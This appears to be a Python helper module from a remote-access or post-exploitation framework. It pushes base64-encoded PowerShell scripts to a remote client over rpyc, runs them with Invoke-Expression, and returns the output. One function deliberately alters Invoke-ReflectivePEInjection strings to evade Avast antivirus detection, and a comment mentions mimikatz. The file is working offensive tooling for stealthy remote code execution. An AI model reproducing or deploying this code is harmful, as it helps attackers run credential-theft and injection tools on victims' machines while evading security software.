# -*- coding: UTF8 -*-
from rpyc.utils.classic import upload
import base64, re, subprocess
from subprocess import PIPE, Popen

def execute_powershell_script(module, content, function, x64IfPossible=False, script_name=None):
    '''
    To get function output, Write-Output should be used (stdout output). 
    If you use Write-Verbose in your code for example, the output will be not captured because the output is not done over stdout (with Write-Verbose)
    '''
    # content = re.sub("Write-Verbose ","Write-Output ", content, flags=re.I) # could break the output with mimikatz
    content = re.sub("Write-Error ","Write-Output ", content, flags=re.I)
    content = re.sub("Write-Warning ","Write-Output ", content, flags=re.I)

    path="powershell.exe"
    arch = 'x64'
    if x64IfPossible:
        if "64" in module.client.desc['os_arch'] and "32" in module.client.desc['proc_arch']:
            path=r"C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe"
    elif "32" in module.client.desc['proc_arch']:
        arch = 'x86'
    
    fullargs=[path, "-C", "-"]

    # create and store the powershell object if it not exists
    if not module.client.powershell[arch]['object']:
        p = module.client.conn.modules.subprocess.Popen(fullargs, stdout=PIPE, stderr=PIPE, stdin=PIPE, bufsize=0, universal_newlines=True, shell=True)
        module.client.powershell[arch]['object'] = p
    else:
        p = module.client.powershell[arch]['object']

    if script_name not in module.client.powershell[arch]['scripts_loaded']:
        module.client.powershell[arch]['scripts_loaded'].append(script_name)
        p.stdin.write("$base64=\"\""+"\n")
        n = 20000
        line = base64.b64encode(content)
        tab = [line[i:i+n] for i in range(0, len(line), n)]
        for t in tab:
            p.stdin.write("$base64+=\"%s\"\n" % t)
            p.stdin.flush()

        p.stdin.write("$d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))\n")
        p.stdin.write("Invoke-Expression $d\n")
    
    # else: the powershell script is already loaded, call the function wanted

    p.stdin.write("\n$a=Invoke-Expression \"%s\" | Format-Table | Out-String\n" % function)
    p.stdin.write("$b=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"$a\"))\n")
    p.stdin.write("Write-Host $b\n")

    # Get the result
    output = ""
    for i in p.stdout.readline():
        output += i
    output = base64.b64decode(output)
    return output

def remove_comments(string):
    '''
    Remove comments in powershell script
    '''
    pattern = r"(\".*?\"|\'.*?\')|(<#.*?#>|#[^\r\n]*$)"
    # first group captures quoted strings (double or single)
    # second group captures comments (#single-line or <# multi-line #>)
    regex = re.compile(pattern, re.MULTILINE|re.DOTALL)
    def _replacer(match):
        # if the 2nd group (capturing comments) is not None,
        # it means we have captured a non-quoted (real) comment string.
        if match.group(2) is not None:
            return "" # so we will return empty to remove the comment
        else: # otherwise, we will return the 1st group
            return match.group(1) # captured quoted-string
    return regex.sub(_replacer, string)

def obfuscatePowershellScript(code):
    '''
    Try to clean powershell script (perhaps in the future 'obfuscation'...).
    Comments are deteleted and some strings are replaced in some powershell functions to bypass AV detection
    '''
    import re
    newCode = code
    newCode = remove_comments(newCode)
    #For Avast detection bypass. Very easy to bypass the AV detection : Shame on you Avast -:)
    #Notice only Avast and Ikarus detect Invoke-ReflectivePEInjection.ps1 as a 'virus' (BV:AndroDrp-B [Drp], HackTool.Win32.Mikatz)
    if "function Invoke-ReflectivePEInjection" in newCode:
        newCode = newCode.replace("$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null", "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERIS'+'TICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null")
    return newCode
    
def obfs_ps_script(script):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.
    """
    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
    return strippedCode
